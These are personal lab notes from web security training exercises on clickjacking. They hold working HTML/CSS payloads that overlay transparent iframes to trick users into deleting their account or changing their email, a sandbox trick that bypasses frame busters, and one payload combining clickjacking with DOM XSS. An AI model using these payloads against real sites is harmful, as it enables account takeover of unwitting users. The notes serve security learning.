# Click jacking

Clickjacking is an interface-based attack.
 
**<iframe>**
helps to place a site on another site. basically it will display one site on another.

attacker user this label and places a real website on top of a decoy website which contain some duplicate buttons(just structure without
ability to click). places a real website on top this decoy website aligning the buttons on the real websites with the buttons fake decoy
site.

the real website's transparency is almost 0 which makes it invisible to the user and he will click the buttons that the attacker planned.



## LAB-1

we have to make a decoy website aligning the delete key exactly for the ```click```  to the main site's ```delete account```. and make the main site transparent.

***payload***
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click</div>
<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account"></iframe>
```

i)  made the <div> element of decoy element and the target site of same size so they both get alligned perfectly.
ii) then changed the position of the text "click" to the match the decoy site's delete account position.


## LAB-2

***Clickjacking with form input data prefilled from a URL parameter***

```parameter - email```

this parameter fills the data into the email box. like any data passed to this parameter is reflected in this update email field. so passing this parameter value with the mail that the attacker want to set and uses clickjacking to make the user to submit it.


**payload**
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```


## LAB-3

to avoid this clickjacking the websites will try to block the framing on their website.

### frame buster
to do that they typically use a javascript block which is included in their website's javascript files.there are called ```frame busters```.

```overriding the frame buster```.

### sandbox

```sandbox``` - attribute that sets xtra restrictions for the content in the iframe.

for example,
```<iframe src="https://www.example.com"  sandbox="allow-forms"></iframe>```

sandbox typically blocks js of the example.com to run when we load the page and also blocks things such as submitting of forms, using apis etc.

```sandbox="allow-forms"``` - allows the example.com to submit forms but the js will not run(to submit the update email form).

**Note :**```sandbox blocks the js of the example.com to run that means it is blocking the frame buster that is typically written in the js.```

**Payload**
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:460px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af500cd04b01a8680733a0800ec0027.web-security-academy.net/my-account?email=hacker111@attacker-website.com"  sandbox="allow-forms"></iframe>
```


## Combining Clickjacking and XSS

The URL loaded inside the iframe contains a maliciously crafted parameter that exploits a DOM XSS vulnerability on that target page.

## LAB-4

xss vulnerability is present in the feedback form, in the ```name``` field.parameter value of the name field is ```name``` itself.

xss due to using ```innerHTML```.(a property of the DOM that allows you to get or set the HTML content inside a specific web page element)

```xss payload - <img src=x onerror=print()>```

load the name parameter with the xss payload and other parameters also and make user to submit the form using clickjacking.

***Payload***
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:810px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a44005604fb15528036670c008a00a3.web-security-academy.net/feedback?name=<img src=x onerror=print()> &email=od@gmail.com&subject=hello&message=zxcvb" ></iframe>
```

